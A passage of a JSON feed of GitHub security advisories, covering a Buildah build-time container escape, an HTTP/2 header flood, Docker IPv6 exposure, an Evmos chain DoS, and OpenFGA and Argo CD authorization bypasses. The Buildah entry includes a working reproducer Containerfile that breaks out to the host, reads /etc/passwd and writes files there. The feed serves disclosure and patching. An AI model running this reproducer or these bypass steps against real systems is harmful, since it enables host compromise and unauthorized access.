\"setenfoce 1\" set, which is the recommendation, files can not be changed.  However, the contents of the <code>/</code> directory can be displayed.  I.e., <code>ls -alF /</code> will show the contents of the host directory.</p>\n<h3 id=\"references\">References</h3>\n<p>Unknown.</p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/containers/buildah/security/advisories/GHSA-pmf3-c36m-g5cf\">https://github.com/containers/buildah/security/advisories/GHSA-pmf3-c36m-g5cf</a></li>\n<li><a href=\"https://github.com/containers/buildah/commit/9de9c20ff368beb84b84fe660773d352519dc1c5\">https://github.com/containers/buildah/commit/9de9c20ff368beb84b84fe660773d352519dc1c5</a></li>\n<li><a href=\"https://github.com/containers/buildah/commit/3deda19137f5dec0285bbb832bd93c22d860b087\">https://github.com/containers/buildah/commit/3deda19137f5dec0285bbb832bd93c22d860b087</a></li>\n<li><a href=\"https://github.com/containers/buildah/commit/a030f7b8cd373075affef1f86de43a87e502f3d8\">https://github.com/containers/buildah/commit/a030f7b8cd373075affef1f86de43a87e502f3d8</a></li>\n<li><a href=\"https://bugzilla.redhat.com/show_bug.cgi?id=2265513\">https://bugzilla.redhat.com/show_bug.cgi?id=2265513</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-1753\">https://nvd.nist.gov/vuln/detail/CVE-2024-1753</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-pmf3-c36m-g5cf\">https://github.com/advisories/GHSA-pmf3-c36m-g5cf</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-pmf3-c36m-g5cf",
            "title": "[github.com/containers/buildah] Container escape at build time",
            "date_modified": "2024-04-20T05:05:26.000Z",
            "date_published": "2024-03-19T20:06:52.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-pmf3-c36m-g5cf"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p><em>What kind of vulnerability is it? Who is impacted?</em></p>\n<p>Users running containers with root privileges allowing a container to run with read/write access to the host system files when selinux is not enabled.  With selinux enabled, some read access is allowed.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>From @nalind </p>\n<pre><code># cat /root/cve-2024-1753.diff\n--- internal/volumes/volumes.go\n+++ internal/volumes/volumes.go\n@@ -11,6 +11,7 @@ import (\n \n     \"errors\"\n \n+\t\"github.com/containers/buildah/copier\"\n     \"github.com/containers/buildah/define\"\n     \"github.com/containers/buildah/internal\"\n     internalParse \"github.com/containers/buildah/internal/parse\"\n@@ -189,7 +190,11 @@ func GetBindMount(ctx *types.SystemContext, args []string, contextDir string, st\n     // buildkit parity: support absolute path for sources from current build context\n     if contextDir != \"\" {\n         // path should be /contextDir/specified path\n-\t\tnewMount.Source = filepath.Join(contextDir, filepath.Clean(string(filepath.Separator)+newMount.Source))\n+\t\tevaluated, err := copier.Eval(contextDir, newMount.Source, copier.EvalOptions{})\n+\t\tif err != nil {\n+\t\t\treturn newMount, \"\", err\n+\t\t}\n+\t\tnewMount.Source = evaluated\n     } else {\n         // looks like its coming from `build run --mount=type=bind` allow using absolute path\n         // error out if no source is set\n</code></pre>\n<h3 id=\"reproducer\">Reproducer</h3>\n<p>Prior to testing, as root, add a memorable username to <code>/etc/passwd</code> via adduser or your favorite editor.   Also create a memorably named file in <code>/</code>.  Suggest: <code>touch /SHOULDNTSEETHIS.txt</code> and <code>adduser SHOULDNTSEETHIS</code>.  After testing, remember to remove both the file and the user from your system.</p>\n<p>Use the following Containerfile</p>\n<pre><code># cat ~/cve_Containerfile\nFROM alpine as base\n\nRUN ln -s / /rootdir\nRUN ln -s /etc /etc2\n\nFROM alpine\n\nRUN echo \"ls container root\"\nRUN ls -l /\n\nRUN echo \"With exploit show host root, not the container's root, and create /BIND_BREAKOUT in / on the host\"\nRUN --mount=type=bind,from=base,source=/rootdir,destination=/exploit,rw ls -l /exploit; touch /exploit/BIND_BREAKOUT; ls -l /exploit\n\nRUN echo \"With exploit show host /etc/passwd, not the container's, and create /BIND_BREAKOUT2 in /etc on the host\"\nRUN --mount=type=bind,rw,source=/etc2,destination=/etc2,from=base ls -l /; ls -l /etc2/passwd; cat /etc2/passwd; touch /etc2/BIND_BREAKOUT2; ls -l /etc2 \n</code></pre>\n<h4 id=\"to-test\">To Test</h4>\n<h5 id=\"testing-with-an-older-version-of-buildah-with-the-issue\">Testing with an older version of Buildah with the issue</h5>\n<pre><code>setenforce 0\nbuildah build -f ~/cve_Containerfile .\n</code></pre>\n<p>As part of the printout from the build, you should be able to see the contents of the <code>/' and </code>/etc<code>directories, including the</code>/SHOULDNOTSEETHIS.txt<code>file that you created, and the contents of the</code>/etc/passwd<code>file which will include the</code>SHOULDNOTSEETHIS<code>user that you created.  In addition, the file</code>/BIND_BREAKOUT<code>and</code>/etc/BIND_BREAKOUT2` will exist on the host after the command is completed.  Be sure to remove those two files between tests.  </p>\n<pre><code>buildah rm -a\nbuildah rmi -a\nrm /BIND_BREAKOUT\nrm /etc/BIND_BREAKOUT2\nsetenforce 1\nbuildah build -f ~/cve_Containerfile .\n</code></pre>\n<p>Neither the <code>/BIND_BREAKEOUT</code> or <code>/etc/BIND_BREAKOUT2</code> files should be created.  An error should be raised during the build when both files are trying to be created.  Also, errors will be raised when the build tries to display the contents of the <code>/etc/passwd</code> file, and nothing will be displayed from that file.  </p>\n<p>However, the files in both the <code>/</code> and <code>/etc</code> directories on the host system will be displayed.</p>\n<h5 id=\"testing-with-the-patch\">Testing with the patch</h5>\n<p>Use the same commands as testing with an older version of Buildah.</p>\n<p>When running using the patched version of Buildah, regardless of the <code>setenforce</code> settings,  you should not see the file that you created or the user that you added.  Also the <code>/BIND_BREAKOUT</code> and the <code>/etc/BIND_BREAKOUT</code> will not exist on the host after the test completes.</p>\n<p>NOTE: With the fix, the contents of the <code>/</code> and <code>/etc</code> directories, and the <code>/etc/passwd</code> file will be displayed, however, it will be the file and contents from the container image, and NOT the host system.  Also the <code>/BIND_BREAKOUT</code> and <code>/etc/BIND_BREAKOUT</code> files will be created in the container image.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Ensure selinux controls are in place to avoid compromising sensitive system files and systems.  With \"setenforce 0\" set, which is not at all advised, the root file system is open for modification with this exploit.  With \"setenfoce 1\" set, which is the recommendation, files can not be changed.  However, the contents of the <code>/</code> directory can be displayed.  I.e., <code>ls -alF /</code> will show the contents of the host directory.</p>\n<h3 id=\"references\">References</h3>\n<p>Unknown.</p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/containers/buildah/security/advisories/GHSA-pmf3-c36m-g5cf\">https://github.com/containers/buildah/security/advisories/GHSA-pmf3-c36m-g5cf</a></li>\n<li><a href=\"https://github.com/containers/buildah/commit/9de9c20ff368beb84b84fe660773d352519dc1c5\">https://github.com/containers/buildah/commit/9de9c20ff368beb84b84fe660773d352519dc1c5</a></li>\n<li><a href=\"https://github.com/containers/buildah/commit/3deda19137f5dec0285bbb832bd93c22d860b087\">https://github.com/containers/buildah/commit/3deda19137f5dec0285bbb832bd93c22d860b087</a></li>\n<li><a href=\"https://github.com/containers/buildah/commit/a030f7b8cd373075affef1f86de43a87e502f3d8\">https://github.com/containers/buildah/commit/a030f7b8cd373075affef1f86de43a87e502f3d8</a></li>\n<li><a href=\"https://bugzilla.redhat.com/show_bug.cgi?id=2265513\">https://bugzilla.redhat.com/show_bug.cgi?id=2265513</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-1753\">https://nvd.nist.gov/vuln/detail/CVE-2024-1753</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-pmf3-c36m-g5cf\">https://github.com/advisories/GHSA-pmf3-c36m-g5cf</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-pmf3-c36m-g5cf",
            "title": "[github.com/containers/buildah] Container escape at build time",
            "date_modified": "2024-04-20T05:05:26.000Z",
            "date_published": "2024-03-19T20:06:52.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-pmf3-c36m-g5cf"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>An attacker may cause an HTTP/2 endpoint to read arbitrary amounts of header data by sending an excessive number of CONTINUATION frames. Maintaining HPACK state requires parsing and processing all HEADERS and CONTINUATION frames on a connection. When a request's headers exceed MaxHeaderBytes, no memory is allocated to store the excess headers, but they are still parsed. This permits an attacker to cause an HTTP/2 endpoint to read arbitrary amounts of header data, all associated with a request which is going to be rejected. These headers can include Huffman-encoded data which is significantly more expensive for the receiver to decode than for an attacker to send. The fix sets a limit on the amount of excess header frames we will process before closing a connection.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-45288\">https://nvd.nist.gov/vuln/detail/CVE-2023-45288</a></li>\n<li><a href=\"https://go.dev/cl/576155\">https://go.dev/cl/576155</a></li>\n<li><a href=\"https://go.dev/issue/65051\">https://go.dev/issue/65051</a></li>\n<li><a href=\"https://groups.google.com/g/golang-announce/c/YgW0sx8mN3M\">https://groups.google.com/g/golang-announce/c/YgW0sx8mN3M</a></li>\n<li><a href=\"https://pkg.go.dev/vuln/GO-2024-2687\">https://pkg.go.dev/vuln/GO-2024-2687</a></li>\n<li><a href=\"https://nowotarski.info/http2-continuation-flood-technical-details\">https://nowotarski.info/http2-continuation-flood-technical-details</a></li>\n<li><a href=\"https://security.netapp.com/advisory/ntap-20240419-0009\">https://security.netapp.com/advisory/ntap-20240419-0009</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-4v7x-pqxf-cx7m\">https://github.com/advisories/GHSA-4v7x-pqxf-cx7m</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-4v7x-pqxf-cx7m",
            "title": "[golang.org/x/net] net/http, x/net/http2: close connections when receiving too many headers",
            "date_modified": "2024-04-19T09:30:48.000Z",
            "date_published": "2024-04-04T21:30:32.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-4v7x-pqxf-cx7m"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>In 26.0.0 and 26.0.1, IPv6 is not disabled on network interfaces, including those belonging to networks where <code>--ipv6=false</code>.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>A container with an <code>ipvlan</code> or <code>macvlan</code> interface will normally be configured to share an external network link with the host machine. Because of this direct access, with IPv6 enabled:</p>\n<ul>\n<li>Containers may be able to communicate with other hosts on the local network over link-local IPv6 addresses.</li>\n<li>If router advertisements are being broadcast over the local network, containers may get SLAAC-assigned addresses.</li>\n<li>The interface  will be a member of IPv6 multicast groups.</li>\n</ul>\n<p>This means interfaces in IPv4-only networks present an unexpectedly and unnecessarily increased attack surface.</p>\n<p>A container with an unexpected IPv6 address can do anything a container configured with an IPv6 address can do. That is, listen for connections on its IPv6 address, open connections to other nodes on the network over IPv6, or attempt a DoS attack by flooding packets from its IPv6 address. This has CVSS score AV:L/AC:H/PR:N/UI:R/S:C/C:N/I:N/A:L (2.7).</p>\n<p>Because the container may not be constrained by an IPv6 firewall, there is increased potential for data exfiltration from the container. This has CVSS score AV:L/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N (4.7).</p>\n<p>A remote attacker could send malicious Router Advertisements to divert traffic to itself, a black-hole, or another device. The same attack is possible today for IPv4 macvlan/ipvlan endpoints with ARP spoofing, TLS is commonly used by Internet APIs to mitigate this risk. The presence of an IPv6 route could impact the container's availability by indirectly abusing the behaviour of software which behaves poorly in a dual-stack environment. For example, it could resolve a name to a DNS AAAA record and keep trying to connect over IPv6 without ever falling back to IPv4, potentially denying service to the container. This has CVSS score AV:A/AC:L/PR:H/UI:N/S:U/C:N/I:N/A:H (4.5).</p>\n<h3 id=\"patches\">Patches</h3>\n<p>The issue is patched in 26.0.2.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>To completely disable IPv6 in a container, use <code>--sysctl=net.ipv6.conf.all.disable_ipv6=1</code> in the <code>docker create</code> or <code>docker run</code> command. Or, in the service configuration of a <code>compose</code> file, the equivalent:</p>\n<pre><code>        sysctls:\n            - net.ipv6.conf.all.disable_ipv6=1\n</code></pre>\n<h3 id=\"references\">References</h3>\n<ul>\n<li>sysctl configuration using <code>docker run</code>:<ul>\n<li><a href=\"https://docs.docker.com/reference/cli/docker/container/run/#sysctl\">https://docs.docker.com/reference/cli/docker/container/run/#sysctl</a></li>\n</ul>\n</li>\n<li>sysctl configuration using <code>docker compose</code>:<ul>\n<li><a href=\"https://docs.docker.com/compose/compose-file/compose-file-v3/#sysctls\">https://docs.docker.com/compose/compose-file/compose-file-v3/#sysctls</a></li>\n</ul>\n</li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/moby/moby/security/advisories/GHSA-x84c-p2g9-rqv9\">https://github.com/moby/moby/security/advisories/GHSA-x84c-p2g9-rqv9</a></li>\n<li><a href=\"https://github.com/moby/moby/commit/7cef0d9cd1cf221d8c0b7b7aeda69552649e0642\">https://github.com/moby/moby/commit/7cef0d9cd1cf221d8c0b7b7aeda69552649e0642</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-32473\">https://nvd.nist.gov/vuln/detail/CVE-2024-32473</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-x84c-p2g9-rqv9\">https://github.com/advisories/GHSA-x84c-p2g9-rqv9</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-x84c-p2g9-rqv9",
            "title": "[github.com/docker/docker] IPv6 enabled on IPv4-only network interfaces",
            "date_modified": "2024-04-19T16:19:43.000Z",
            "date_published": "2024-04-18T21:52:08.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-x84c-p2g9-rqv9"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>源码中密码校验处使用 != 符号，而不是<code>hmac.Equal</code>，这可能导致产生计时攻击漏洞，从而爆破密码。<br>建议使用 <code>hmac.Equal</code> 比对密码。</p>\n<h3 id=\"details\">Details</h3>\n<p><a href=\"https://github.com/1Panel-dev/1Panel/blob/dev/backend/app/service/auth.go#L81C5-L81C26\">https://github.com/1Panel-dev/1Panel/blob/dev/backend/app/service/auth.go#L81C5-L81C26</a></p>\n<h3 id=\"poc\">PoC</h3>\n<h3 id=\"impact\">Impact</h3>\n<p>该产品的所有使用者。</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/1Panel-dev/1Panel/security/advisories/GHSA-6m9h-2pr2-9j8f\">https://github.com/1Panel-dev/1Panel/security/advisories/GHSA-6m9h-2pr2-9j8f</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-30257\">https://nvd.nist.gov/vuln/detail/CVE-2024-30257</a></li>\n<li><a href=\"https://github.com/1Panel-dev/1Panel/blob/dev/backend/app/service/auth.go#L81C5-L81C26\">https://github.com/1Panel-dev/1Panel/blob/dev/backend/app/service/auth.go#L81C5-L81C26</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-6m9h-2pr2-9j8f\">https://github.com/advisories/GHSA-6m9h-2pr2-9j8f</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-6m9h-2pr2-9j8f",
            "title": "[github.com/1Panel-dev/1Panel] 1Panel's password verification is suspected to have a timing attack vulnerability",
            "date_modified": "2024-04-18T16:44:17.000Z",
            "date_published": "2024-04-18T16:44:16.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-6m9h-2pr2-9j8f"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p><em>What kind of vulnerability is it? Who is impacted?</em></p>\n<p>Using the vesting module, a malicious attacker can create a new vesting account at a given\naddress, before a contract is created on that address.</p>\n<p>Addresses of smart contracts deployed to the EVM are deterministic. Therefore, it would be possible for an attacker to front-run a contract creation and create a vesting account at that address. \nWhen an address has been initialized without any contract code deployed to it, it will not be possible to upload any afterwards. In the described attack, this would mean that a malicious actor could prevent smart contracts from being deployed correctly.</p>\n<p>In order to remediate this, an alternative user flow is being implemented for the vesting module:</p>\n<ul>\n<li>only the account receiving the vesting funds will be able to create such an account by calling the <code>CreateClawbackVestingAccount</code> method and defining a funder address</li>\n<li>vesting and lockup periods can then be created by that funder address using <code>FundClawbackAccount</code></li>\n</ul>\n<h3 id=\"patches\">Patches</h3>\n<p><em>Has the problem been patched? What versions should users upgrade to?</em></p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p><em>Is there a way for users to fix or remediate the vulnerability without upgrading?</em></p>\n<h3 id=\"references\">References</h3>\n<p><em>Are there any links users can visit to find out more?</em></p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/evmos/evmos/security/advisories/GHSA-m99c-q26r-m7m7\">https://github.com/evmos/evmos/security/advisories/GHSA-m99c-q26r-m7m7</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-m99c-q26r-m7m7\">https://github.com/advisories/GHSA-m99c-q26r-m7m7</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-m99c-q26r-m7m7",
            "title": "[github.com/evmos/evmos/v13] Evmos vulnerable to unauthorized account creation with vesting module",
            "date_modified": "2024-04-17T17:37:24.000Z",
            "date_published": "2024-04-17T17:37:23.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-m99c-q26r-m7m7"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p><em>What kind of vulnerability is it? Who is impacted?</em></p>\n<p>Using the vesting module, a malicious attacker can create a new vesting account at a given\naddress, before a contract is created on that address.</p>\n<p>Addresses of smart contracts deployed to the EVM are deterministic. Therefore, it would be possible for an attacker to front-run a contract creation and create a vesting account at that address. \nWhen an address has been initialized without any contract code deployed to it, it will not be possible to upload any afterwards. In the described attack, this would mean that a malicious actor could prevent smart contracts from being deployed correctly.</p>\n<p>In order to remediate this, an alternative user flow is being implemented for the vesting module:</p>\n<ul>\n<li>only the account receiving the vesting funds will be able to create such an account by calling the <code>CreateClawbackVestingAccount</code> method and defining a funder address</li>\n<li>vesting and lockup periods can then be created by that funder address using <code>FundClawbackAccount</code></li>\n</ul>\n<h3 id=\"patches\">Patches</h3>\n<p><em>Has the problem been patched? What versions should users upgrade to?</em></p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p><em>Is there a way for users to fix or remediate the vulnerability without upgrading?</em></p>\n<h3 id=\"references\">References</h3>\n<p><em>Are there any links users can visit to find out more?</em></p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/evmos/evmos/security/advisories/GHSA-m99c-q26r-m7m7\">https://github.com/evmos/evmos/security/advisories/GHSA-m99c-q26r-m7m7</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-m99c-q26r-m7m7\">https://github.com/advisories/GHSA-m99c-q26r-m7m7</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-m99c-q26r-m7m7",
            "title": "[github.com/evmos/evmos/v13/x/vesting] Evmos vulnerable to unauthorized account creation with vesting module",
            "date_modified": "2024-04-17T17:37:24.000Z",
            "date_published": "2024-04-17T17:37:23.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-m99c-q26r-m7m7"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h2 id=\"impact\">Impact</h2>\n<p><em>What kind of vulnerability is it? Who is impacted?</em></p>\n<p>An attacker can use this bug to bypass the block gas limit and gas payment completely to perform a full Denial-of-Service against the chain.</p>\n<h2 id=\"disclosure\">Disclosure</h2>\n<p>Evmos versions below <code>v11.0.1</code> do not check for <code>MsgEthereumTx</code> messages that are nested under other messages. This allows a malicious actor to perform EVM transactions that do not meet the checks performed under <code>newEthAnteHandler</code>. This opens the possibility for the DOS of validators and consequently halt the chain through an infinite EVM execution.</p>\n<h3 id=\"additional-details\">Additional details</h3>\n<p>The attack scenario is as follows:</p>\n<ol>\n<li>The attacker deploys a simple smart contract with an infinite loop to the chain.  </li>\n<li>The attacker calls the smart contract using an embedded transaction with an extremely high gas value (<code>uint64</code> max or similar). </li>\n<li>Once the transaction is included in a block, nodes will try to execute the EVM transaction with almost infinite gas and get stuck. <strong>This stops new block creation and effectively halts the chain, requiring a manual restart of all nodes.</strong></li>\n</ol>\n<h2 id=\"users-impacted\">Users Impacted</h2>\n<p>All Evmos users are impacted by this vulnerability as it has the potential to halt the chain. Users' funds and chain state are safe but when under attack, the chain could be deemed unusable. </p>\n<h2 id=\"patches\">Patches</h2>\n<p><em>Has the problem been patched? What versions should users upgrade to?</em></p>\n<p>The vulnerability has been patched on Evmos versions ≥v12.0.0.</p>\n<h3 id=\"details\">Details</h3>\n<p>As a temporary workaround, the fix blocks <code>MsgEthereumTxs</code> messages from being sent under the <code>authz</code> module's <code>MsgExec</code> message. It also covers the scenario in which <code>MsgEthereumTx</code> are deeply nested by:</p>\n<ul>\n<li>Doing a recursive check over the nested messages of <code>MsgExec</code></li>\n<li>Limiting the amount of possible nested messages (inner messages) in <code>MsgExec</code></li>\n</ul>\n<p>This is done by adding an additional <code>AnteHandler</code> decorator (<code>AuthzLimiterDecorator</code>) for Cosmos and EIP-712 transactions.</p>\n<p>This is a state machine-breaking change as it restricts previously allowed messages and thus requires a hard-fork upgrade.</p>\n<h2 id=\"references\">References</h2>\n<p><strong>Are there any links users can visit to find out more?</strong></p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory:</p>\n<ul>\n<li>Reach out to the Core Team in <a href=\"https://discord.gg/evmos\">Discord</a></li>\n<li>Open a discussion in <a href=\"https://github.com/evmos/evmos/discussions\">evmos/evmos</a></li>\n<li>Email us at <a href=\"mailto:security@evmos.org\">security@evmos.org</a> for security questions</li>\n<li>For Press, email us at <a href=\"mailto:evmos@west-comms.com\">evmos@west-comms.com</a>.</li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/evmos/evmos/security/advisories/GHSA-v6rw-hhgg-wc4x\">https://github.com/evmos/evmos/security/advisories/GHSA-v6rw-hhgg-wc4x</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-v6rw-hhgg-wc4x\">https://github.com/advisories/GHSA-v6rw-hhgg-wc4x</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-v6rw-hhgg-wc4x",
            "title": "[github.com/evmos/evmos/v11] Evmos vulnerable to DOS and transaction fee expropiation through Authz exploit",
            "date_modified": "2024-04-17T17:35:22.000Z",
            "date_published": "2024-04-17T17:35:21.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-v6rw-hhgg-wc4x"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h1 id=\"overview\">Overview</h1>\n<p>Some end users of OpenFGA v1.5.0 or later are vulnerable to authorization bypass when calling Check or ListObjects APIs.</p>\n<h1 id=\"am-i-affected\">Am I Affected?</h1>\n<p>You are very likely affected if your model involves exclusion (e.g. <code>a but not b</code>) or intersection (e.g. <code>a and b</code>) and you have any cyclical relationships. If you are using these, please update as soon as possible.</p>\n<h1 id=\"fix\">Fix</h1>\n<p>Update to v1.5.3</p>\n<h1 id=\"backward-compatibility\">Backward Compatibility</h1>\n<p>This update is backward compatible.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/openfga/openfga/security/advisories/GHSA-8cph-m685-6v6r\">https://github.com/openfga/openfga/security/advisories/GHSA-8cph-m685-6v6r</a></li>\n<li><a href=\"https://github.com/openfga/openfga/commit/b6a6d99b2bdbf8c3781503989576076289f48ed2\">https://github.com/openfga/openfga/commit/b6a6d99b2bdbf8c3781503989576076289f48ed2</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-31452\">https://nvd.nist.gov/vuln/detail/CVE-2024-31452</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-8cph-m685-6v6r\">https://github.com/advisories/GHSA-8cph-m685-6v6r</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-8cph-m685-6v6r",
            "title": "[github.com/openfga/openfga] OpenFGA Authorization Bypass",
            "date_modified": "2024-04-17T17:05:29.000Z",
            "date_published": "2024-04-16T22:57:58.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-8cph-m685-6v6r"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>I can convince the UI to let me do things with an invalid Application.</p>\n<ol>\n<li>Admin gives me <code>p, michael, applications, *, demo/*, allow</code>, where <code>demo</code> can just deploy to the <code>demo</code> namespace</li>\n<li>Admin gives me AppProject <code>dev</code> which reconciles from ns <code>dev-apps</code></li>\n<li>Admin gives me <code>p, michael, applications, sync, dev/*, allow</code>, i.e. no updating via the UI allowed, gitops-only</li>\n<li>I create an Application called <code>pwn</code> in <code>dev-apps</code> with project dev and sync the app with sources from git</li>\n<li>I change the Application’s project to demo via kubectl or gitops (whichever mechanism my admins have given me, because it should be safe)</li>\n<li>I use the UI to edit the resource which should only be mutable via gitops</li>\n</ol>\n<h3 id=\"patches\">Patches</h3>\n<p>A patch for this vulnerability has been released in the following Argo CD versions:</p>\n<p>v2.10.7 \nv2.9.12 \nv2.8.16</p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory:</p>\n<p>Open an issue in <a href=\"https://github.com/argoproj/argo-cd/issues\">the Argo CD issue tracker</a> or <a href=\"https://github.com/argoproj/argo-cd/discussions\">discussions</a>\nJoin us on <a href=\"https://argoproj.github.io/community/join-slack\">Slack</a> in channel #argo-cd</p>\n<h3 id=\"credits\">Credits</h3>\n<p>This vulnerability was found &amp; reported by @crenshaw-dev (Michael Crenshaw)</p>\n<p>The Argo team would like to thank these contributors for their responsible disclosure and constructive communications during the resolve of this issue</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/argoproj/argo-cd/security/advisories/GHSA-2gvw-w6fj-7m3c\">https://github.com/argoproj/argo-cd/security/advisories/GHSA-2gvw-w6fj-7m3c</a></li>\n<li><a href=\"https://github.com/argoproj/argo-cd/commit/c514105af739eebedb9dbe89d8a6dd8dfc30bb2c\">https://github.com/argoproj/argo-cd/commit/c514105af739eebedb9dbe89d8a6dd8dfc30bb2c</a></li>\n<li><a href=\"https://github.com/argoproj/argo-cd/commit/c5a252c4cc260e240e2074794aedb861d07e9ca5\">https://github.com/argoproj/argo-cd/commit/c5a252c4cc260e240e2074794aedb861d07e9ca5</a></li>\n<li><a href=\"https://github.com/argoproj/argo-cd/commit/e0ff56d89fbd7d066e9c862b30337f6520f13f17\">https://github.com/argoproj/argo-cd/commit/e0ff56d89fbd7d066e9c862b30337f6520f13f17</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-2gvw-w6fj-7m3c\">https://github.com/advisories/GHSA-2gvw-w6fj-7m3c</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-2gvw-w6fj-7m3c",
            "title": "[github.com/argoproj/argo-cd/v2] Argo CD's API server does not enforce project sourceNamespaces",
            "date_modified": "2024-04-15T20:20:51.000Z",
            "date_published": "2024-04-15T20:20:50.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-2gvw-w6fj-7m3c"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>I can convince the UI to let me do things with an invalid Application.</p>\n<ol>\n<li>Admin gives me <code>p, michael, applications, *, demo/*, allow</code>, where <code>demo</code> can just deploy to the <code>demo</code> namespace</li>\n<li>Admin gives me AppProject <code>dev</code> which reconciles from ns <code>dev-apps</code></li>\n<li>Admin gives me <code>p, michael, applications, sync, dev/*, allow</code>, i.e. no updating via the UI allowed, gitops-only</li>\n<li>I create an Application called <code>pwn</code> in <code>dev-apps</code> with project dev and sync the app with sources from git</li>\n<li>I change the Application’s project to demo via kubectl or gitops (whichever mechanism my admins have given me, because it should be safe)</li>\n<li>I use the UI to edit the resource which should only be mutable via gitops</li>\n</ol>\n<h3 id=\"patches\">Patches</h3>\n<p>A patch for this vulnerability has been released in the following Argo CD versions:</p>\n<p>v2.10.7 \nv2.9.12 \nv2.8.16</p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory:</p>\n<p>Open an issue in <a href=\"https://github.com/argoproj/argo-cd/issues\">the Argo CD issue tracker</a> or <a href=\"https://github.com/argoproj/argo-cd/discussions\">discussions</a>\nJoin us on <a href=\"https://argoproj.github.io/community/join-slack\">Slack</a> in channel #argo-cd</p>\n<h3 id=\"credits\">Credits</h3>\n<p>This vulnerability was found &amp; reported by @crenshaw-dev (Michael Crenshaw)</p>\n<p>The Argo team would like to thank these contributors for their responsible disclosure and constructive communications during the resolve of this issue</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/argoproj/argo-cd/security/advisories/GHSA-2gvw-w6fj-7m3c\">https://github.com/argoproj/argo-cd/security/advisories/GHSA-2gvw-w6fj-7m3c</a></li>\n<li><a href=\"https://github.com/argoproj/argo-cd/commit/c514105af739eebedb9dbe89d8a6dd8dfc30bb2c\">https://github.com/argoproj/argo-cd/commit/c514105af739eebedb9dbe89d8a6dd8dfc30bb2c</a></li>\n<li><a 